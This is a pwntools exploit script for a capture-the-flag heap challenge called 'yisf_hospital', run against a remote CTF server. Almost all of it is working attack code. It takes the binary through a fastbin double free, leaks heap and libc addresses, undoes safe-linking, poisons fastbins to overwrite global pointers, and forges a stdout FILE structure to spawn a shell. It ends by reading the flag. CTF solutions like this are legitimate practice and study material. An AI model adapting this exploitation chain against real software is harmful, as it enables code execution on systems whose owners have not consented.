#!/usr/bin/env python3

from pwn import *

exe = ELF('./yisf_hospital_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def add(idx, disea, name):
	sla(b">>> ", b"1")
	sla(b">>> ", f"{idx}".encode())
	sa(b">>> ", disea)
	sa(b">>> ", name)

def dele(idx):
	sla(b">>> ", b"2")
	sla(b">>> ", f"{idx}".encode())

def edit(idx, disea, name):
	sla(b">>> ", b"3")
	sla(b">>> ", f"{idx}".encode())
	sa(b">>> ", disea)
	sa(b">>> ", name)

def review(data, ok = True):
	sla(b">>> ", b"5")
	if(ok):
		sa(b"> ", data)

def deobfu(val):
	# assume that heap address is only 6 byte length (48 bit)
	res = 0
	# 12 bit cao nhat luon giu nguyen
	a = 0
	b = ((val >> 36) & 0xfff) ^ a
	res += b << 36
	a = b
	# 12 bit cao thu nhi
	b = ((val >> 24) & 0xfff) ^ a
	res += b << 24
	a = b
	# 12 bit cao thu ba
	b = ((val >> 12) & 0xfff) ^ a
	res += b << 12
	a = b
	# 12 bit cuoi cua heap region luon bat dau = 000
	# no need calculate
	return res


script = '''
# read in edit
b *0x401890 
# call menu
b *0x401BF6
'''

p = remote("host1.dreamhack.games", 21062)
#p = process('./yisf_hospital_patched')

sa(b"number?\n", b"A" * 0xF)

# double free
for i in range(1, 10 + 1):
	add(i, b"0" * 0x10, b"0" * 8)
for i in range(4, 10 + 1):
	dele(i)

dele(3)
dele(2)
dele(1)
# calloc doesnt memset trick
add(1, b"1" * 0x10, b"1" * 8)
edit(1, p64(0x22), b"1" * 8)

# leak heap
sla(b">>> ", b"1")
sla(b">>> ", b"2")
sa(b">>> ", b"A")
rcu(b"disease : ")
leak = u64((p.recvline()[:-1:]).ljust(8, b"\x00"))
lleak("leak", leak)
heap_base = deobfu(leak)
lleak("heap_base", heap_base)
sa(b">>> ", b"A" * 8)

# leak libc
## fastbin consolidate
review(b"2" * 0x10)
## now chunk 3 is in smallbin and have libc pointer

# leak libc
## calloc doesnt memset trick
edit(2, p64(0x22), b"2" * 8)
sla(b">>> ", b"1")
sla(b">>> ", b"3")
sa(b">>> ", p8(0xf0))
rcu(b"disease : ")
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x21acf0
lleak("libc_base", libc_base)
sa(b">>> ", b"2" * 8)

# padding the reviewnum to 0x21
for i in range(0x20):
	review(b"", False)

# turn off the mmap bit of chunk 2 so we can free it later
edit(1, p64(0x21), b"3" * 8)

# double free
dele(1)
dele(2)
dele(1)

# fastbin poisoning to reviewnum and person[0]
mangle = 0x404080 ^ (heap_base + 0x290) >> 12
add(1, p64(mangle), b"3" * 8)
add(2, b"3" * 0x10, b"3" * 8)
add(4, b"3" * 0x10, b"3" * 8)

# create arbitrary pointer point to person[] array
add(5, b"4" * 0x10, p64(0x4040a8))

# now we have arbitrary write via control of person[] and edit func, change reviewnum to 0 and perform fsop
fileptr = heap_base + 0x8f0

# now we need to clear the fastbin head in arena (which current is 0x404 because we fastbin poisoning things)
## clear it so when malloc 0x500, consolidate wont get error
edit(1, p64(0x404088), p64(libc_base + 0x21ac90)) # make ptr point to fastbin 0x20 head in main arena and ptr point to reviewnum
edit(4, b"A" + p8(0), p64(0)) # clear fastbin head
edit(4, p8(0), p64(0))

# clear reviewnum
edit(2, p8(0), b"4")

# perform fsop
## i want to overwrite stdout in binary point to fake prepared file struct
### fsop from note
_IO_2_1_stdout_ = fileptr
system = libc_base + libc.symbols['system']
fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = system
fp._lock = _IO_2_1_stdout_ + 0x50
fp._wide_data = _IO_2_1_stdout_
fp.vtable = libc_base  + libc.symbols['_IO_wfile_jumps'] - 0x20
payload = bytes(fp) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)
review(payload)

# overwrite and trigger
## i found out overwrite via strcpy is very stupid (because stdout will be corrupted before we can fully overwrite it) so i fastbin poisoning to there
# prepare fake size 0x22 to calloc doesnt memeset
edit(1, p64(0x404088), b"5" * 5) # make ptr point to stdout in binary - 8
edit(1, p64(0x404088), b"5" * 4)
edit(1, p64(0x404088), p64(0x404018))
edit(4, p64(0x22), b"5")

# now only need to perform double free -> fastbin poisoning and overwrite stdout (i wont talk anymore)
add(6, b"6" * 8, b"6" * 8)
add(7, b"6" * 8, b"6" * 8)
dele(6)
dele(7)
dele(6)
mangle = 0x0000000000404010 ^ (heap_base + 0xdf0) >> 12
add(6, p64(mangle), b"6" * 8)
add(7, b"6" * 0x10, b"6" * 8)
add(8, b"6" * 0x10, b"6" * 8)
sla(b">>> ", b"1")
sla(b">>> ", f"{9}".encode())
sa(b">>> ", p64(fileptr))

sleep(0.1)
sl(b"cat flag")

p.interactive()
#YISF{c4ll0c_15_700_d4n63r0u5_b3_c4r3ful_n07_70_c47ch_4_c0ld}
